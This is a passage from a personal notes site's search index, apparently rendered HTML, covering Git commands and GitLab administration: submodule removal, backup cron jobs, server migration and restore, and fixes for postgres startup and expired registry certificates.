style=\"color:#75715e\"\u003e# Remove submodule\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emodulePath\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;themes/toha\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule deinit -f \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rm \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm -rf .git/modules/\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config --remove-section submodule.\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm -f .gitmodules\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecommit hash\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rev-parse HEAD\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecommit tag\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit describe --tags\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eworktree\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit worktree list\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# add\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit worktree add ../dirname branch-name\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egit config\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[user]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eemail\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezeyanlin@outlook.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  name = Ricky\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  signingkey = 2A4313489FDCA802ED6FCC214B03D879EA73DF37\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[commit]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003egpgsign\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egit config1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003eFor golang import package\u003c/p\u003e","tags":null,"title":"Git Command"},{"categories":null,"contents":" cleanup doc\n# artifacts gitlab-rake gitlab:cleanup:orphan_job_artifact_files # expire session gitlab-rake gitlab:cleanup:sessions:active_sessions_lookup_keys # lfs gitlab-rake gitlab:cleanup:orphan_lfs_files # project gitlab-rake gitlab:cleanup:project_uploads gitlab-rake gitlab:cleanup:remote_upload_files # registry gitlab-ctl registry-garbage-collect gitlab-ctl registry-garbage-collect -m migration 1. Copy Old Crontab、Old /etc/gitlab、update-ca-trust 2. Version should be same 3. Copy newest backup file 4. Stop Services gitlab-ctl stop unicorn gitlab-ctl stop puma gitlab-ctl stop sidekiq gitlab-ctl status 5. Restore File must put in /var/opt/gitlab/backup\nchown git:git backupfile gitlab-backup restore BACKUP=11493107454_2018_04_25_10.6.4-ce 6. Check gitlab-ctl reconfigure gitlab-ctl restart gitlab-rake gitlab:check SANITIZE=true 7. Unlock gitlab-runner at Admin Area 8. Pages: Add https settings in gitlab.rb, Admin Area -\u0026gt; Applications -\u0026gt; Destroy old System OAuth, and remove secret in gitlab-secret.json. gitlab-ctl reconfigure ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/gitlab/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecleanup\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003e\u003ca href=\"https://docs.gitlab.com/ee/administration/packages/container_registry.html\" target=\"_blank\" rel=\"noopener\"\u003edoc\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# artifacts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:orphan_job_artifact_files\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# expire session\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:sessions:active_sessions_lookup_keys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# lfs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:orphan_lfs_files\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# project\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:project_uploads\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-rake gitlab:cleanup:remote_upload_files\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# registry\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl registry-garbage-collect\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl registry-garbage-collect -m\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emigration\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"1-copy-old-crontabold-etcgitlabupdate-ca-trust\"\u003e1. Copy Old Crontab、Old /etc/gitlab、update-ca-trust\u003c/h6\u003e\n\u003ch6 id=\"2-version-should-be-same\"\u003e2. Version should be same\u003c/h6\u003e\n\u003ch6 id=\"3-copy-newest-backup-file\"\u003e3. Copy newest backup file\u003c/h6\u003e\n\u003ch6 id=\"4-stop-services\"\u003e4. Stop Services\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl stop unicorn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl stop puma\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl stop sidekiq\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitlab-ctl status\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"5-restore\"\u003e5. Restore\u003c/h6\u003e\n\u003cblockquote\u003e\n\u003cp\u003eFile must put in /var/opt/gitlab/backup\u003c/p\u003e","tags":null,"title":"Gitlab Command"},{"categories":null,"contents":" add member by project Admin Area -\u0026gt; Settings -\u0026gt; General -\u0026gt; LDAP settings -\u0026gt; Lock memberships to LDAP synchronization -\u0026gt; Cancel backup cronjob # Backup Gitlab configs 1 0 * * * /usr/bin/tar -zcf /var/opt/gitlab/backups/`date +%Y_%m_%d`_gitlab_config.tar.gz /etc/gitlab \u0026amp;\u0026gt; /tmp/backup.log # Backup Gitlab data 1 1 * * * /usr/bin/gitlab-backup create STRATEGY=copy BACKUP=`date +%Y_%m_%d` \u0026amp;\u0026gt;\u0026gt; /tmp/backup.log # Rotate 0 2 * * * /usr/bin/rm -f `find /data/backups/ -name \u0026#34;*.tar*\u0026#34; -mtime +15` gitlab-ci.yml template gitbook gitlab-ci.yml gitbook.yml golang gitlab-ci.yml hexo gitlab-ci.yml Static resources gitlab-ci.yml template gitlab-ci.yml config gitlab-runner gitlab-runner.toml issue console output while install [execute] psql: could not connect to server: Connection refused Is the server running locally and accepting connections on Unix domain socket \u0026#34;/var/opt/gitlab/postgresql/.s.PGSQL.5432\u0026#34;? solve # stop service sudo gitlab-ctl stop sudo systemctl stop gitlab-runsvdir.service # check if there are any postgres processes; shouldn\u0026#39;t be ps aux | grep postgre # remove process pid sudo rm /var/opt/gitlab/postgresql/data/postmaster.pid # start service sudo systemctl start gitlab-runsvdir.service sudo gitlab-ctl reconfigure issue1 解決 Gitlab Pages 限制訪問權限後的 redirect invalid url。 Remove \u0026ldquo;gitlab_pages\u0026rdquo; block from /etc/gitlab/gitlab-secrets.json gitlab-ctl reconfigure issue2 console output # Gitlab Container Registry Error response from daemon: Get https://registry.knowhow.fun/v2/: x509: certificate has expired or is not yet valid /etc/gitlab/gitlab.rb solve yum install ca-certificates cd /etc/gitlab openssl genrsa -out ca.key 4096 openssl req -new -x509 -days 3650 -key ca.key -out ca.crt openssl genrsa -out server.key 4096 openssl req -new -key server.key -out server.csr openssl x509 -req -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt cp server.crt /etc/pki/ca-trust/source/anchors/ cp ca.crt /etc/pki/ca-trust/source/anchors/ update-ca-trust issue3 console output # Gitlab Container Registry received unexpected HTTP status: 500 Internal Server Error solve /etc/gitlab/gitlab.rb\ngitlab_rails[\u0026#39;ldap_servers\u0026#39;] = { \u0026#39;main\u0026#39; =\u0026gt; { \u0026#39;encryption\u0026#39; =\u0026gt; \u0026#39;plain\u0026#39;, } } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/gitlab/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eadd member by project\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003eAdmin Area -\u0026gt; Settings -\u0026gt; General -\u0026gt; LDAP settings -\u0026gt; Lock memberships to LDAP synchronization -\u0026gt; Cancel\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ebackup cronjob\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Backup Gitlab configs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e * * * /usr/bin/tar -zcf /var/opt/gitlab/backups/\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003edate +%Y_%m_%d\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e_gitlab_config.tar.gz /etc/gitlab \u0026amp;\u0026gt; /tmp/backup.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Backup Gitlab data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e * * * /usr/bin/gitlab-backup create STRATEGY\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecopy BACKUP\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003edate +%Y_%m_%d\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e \u0026amp;\u0026gt;\u0026gt; /tmp/backup.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Rotate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e * * * /usr/bin/rm -f \u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003efind /data/backups/ -name \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*.tar*\u0026#34;\u003c/span\u003e -mtime +15\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egitlab-ci.yml template\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"gitbook\"\u003egitbook\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/gitbook/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/gitbook/.gitbook.yml\"\u003egitbook.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"golang\"\u003egolang\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/golang/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"hexo\"\u003ehexo\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/hexo/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"static-resources\"\u003eStatic resources\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/static/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"template\"\u003etemplate\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/ci/template/.gitlab-ci.yml\"\u003egitlab-ci.yml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econfig\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"gitlab-runner\"\u003egitlab-runner\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/gitlab/config/gitlab-runner/gitlab-runner.toml\"\u003egitlab-runner.toml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"console-output-while-install\"\u003econsole output while install\u003c/h6\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[execute] psql: could not connect to server: Connection refused\n            Is the server running locally and accepting\n            connections on Unix domain socket \u0026#34;/var/opt/gitlab/postgresql/.s.PGSQL.5432\u0026#34;?\n\u003c/code\u003e\u003c/pre\u003e\u003ch6 id=\"solve\"\u003esolve\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# stop service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo gitlab-ctl stop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl stop gitlab-runsvdir.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# check if there are any postgres processes; shouldn\u0026#39;t be\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eps aux | grep postgre\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# remove process pid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo rm /var/opt/gitlab/postgresql/data/postmaster.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# start service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl start gitlab-runsvdir.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo gitlab-ctl reconfigure\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"解決-gitlab-pages-限制訪問權限後的-redirect-invalid-url\"\u003e解決 Gitlab Pages 限制訪問權限後的 redirect invalid url。\u003c/h6\u003e\n\u003col\u003e\n\u003cli\u003eRemove \u0026ldquo;gitlab_pages\u0026rdquo; block from \u003ccode\u003e/etc/gitlab/gitlab-secrets.json\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egitlab-ctl reconfigure\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"console-output\"\u003econsole output\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Gitlab Container Registry\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eError response from daemon: Get https://registry.knowhow.fun/v2/: x509: certificate has expired or is not yet valid\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"etcgitlabgitlabrb\"\u003e\u003ca href=\"/notes/docs/gitlab/config/gitlab/gitlab.rb\"\u003e/etc/gitlab/gitlab.rb\u003c/a\u003e\u003c/h6\u003e\n\u003ch6 id=\"solve\"\u003esolve\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install ca-certificates\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /etc/gitlab\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl genrsa -out ca.key \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -new -x509 -days \u003cspan style=\"color:#ae81ff\"\u003e3650\u003c/span\u003e -key ca.key -out ca.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl genrsa -out server.key \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -new -key server.key -out server.csr\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl x509 -req -days \u003cspan style=\"color:#ae81ff\"\u003e3650\u003c/span\u003e -in server.csr -CA ca.crt -CAkey ca.key -set_serial \u003cspan style=\"color:#ae81ff\"\u003e01\u003c/span\u003e -out server.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp server.crt /etc/pki/ca-trust/source/anchors/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp ca.crt /etc/pki/ca-trust/source/anchors/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eupdate-ca-trust\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            